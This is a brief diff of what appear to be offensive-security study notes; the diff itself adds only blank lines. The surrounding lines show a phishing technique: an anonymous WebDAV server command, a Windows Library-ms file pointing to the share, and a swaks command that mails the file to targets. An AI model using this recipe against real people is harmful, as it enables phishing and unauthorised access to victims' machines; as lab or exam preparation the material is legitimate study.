@@ -55,6 +55,7 @@ End Sub
 	- `pip3 install wsgidav` for a WebDAV server to host/serve files
 	- usage: `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root {directory}`  
 - config.Library-ms file contents:
+
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
@@ -76,5 +77,6 @@ End Sub
 </searchConnectorDescriptionList>
 </libraryDescription>
 ```
+
 - Sending a phishing email with the share:
 	- `sudo swaks -t {to_email} -t {to_email} --from {from_email} --attach @config.Library-ms --server {mail_server} --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`
